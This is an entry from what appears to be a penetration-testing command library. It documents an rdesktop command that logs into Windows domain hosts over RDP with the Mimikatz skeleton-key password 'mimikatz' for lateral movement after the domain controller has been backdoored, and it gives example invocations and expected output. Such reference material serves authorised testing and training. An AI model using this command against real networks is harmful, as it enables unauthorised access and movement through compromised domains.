---
type: command
executor: bash
data: 'rdesktop TARGET_IP:3389 -u TARGET_USERNAME -p mimikatz -d DOMAIN'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - lateral-movement
  - rdp
  - skeleton-key
verified: true
validated: true
---

# rdesktop-rdp-login

## Command

```bash
rdesktop TARGET_IP:3389 -u TARGET_USERNAME -p mimikatz -d DOMAIN
```

## Description

Establishes an RDP connection from a Linux client to a Windows target using rdesktop, authenticating with a domain username and the skeleton key password "mimikatz". This provides interactive shell access for post-exploitation after skeleton key injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| TARGET_IP | Target machine's IP address (e.g., 10.0.0.2) | Yes |
| 3389 | RDP port (default) | Yes |
| -u TARGET_USERNAME | Username to authenticate as (e.g., test) | Yes |
| -p mimikatz | Skeleton key password | Yes |
| -d DOMAIN | Domain name (e.g., pentestlab) | Yes |

## Examples

### Basic Usage

```bash
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```

### With Full Domain

```bash
rdesktop 192.168.1.100:3389 -u administrator -p mimikatz -d corp.local
```

## Expected Output

Autoselected keyboard layout [us]

Positioning local display's mouse at (0,0)

Connected to TARGET_IP, display is at 1024x768

[Login successful, RDP desktop appears]

## Related

- [[procedures/Skeleton-Key-Password-Injection-with-Mimikatz]]
- [[commands/net-use-map-admin-share]]
